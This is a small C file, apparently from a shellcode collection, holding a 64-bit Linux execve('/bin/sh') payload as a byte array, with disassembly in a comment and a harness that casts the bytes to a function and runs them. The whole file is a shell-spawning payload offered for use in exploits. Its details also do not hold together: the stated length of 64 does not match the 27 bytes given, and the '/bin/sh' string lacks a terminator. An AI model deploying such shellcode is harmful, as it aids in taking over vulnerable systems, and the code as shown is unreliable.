/*
    may 2 2019
    
    create by parth
    Tested on: Linux kali 4.19.0-4-amd64, x86_64 GNU/Linux
    Shellcode Length:  64

    0000000000000002 <shellcode>:
         
         0000000000401008 <_start>:
  401008:       48 31 c0                xor    rax,rax
  40100b:       48 89 c2                mov    rdx,rax
  40100e:       48 89 c6                mov    rsi,rax
  401011:       48 8d 3d e8 ff ff ff    lea    rdi,[rip+0xffffffffffffffe8]        # 401000 <msg>
  401018:       04 3b                   add    al,0x3b
  40101a:       0f 05                   syscall 



*/
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\xe8\xff\xff\xff\x04\x3b\x0f\x05";


main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
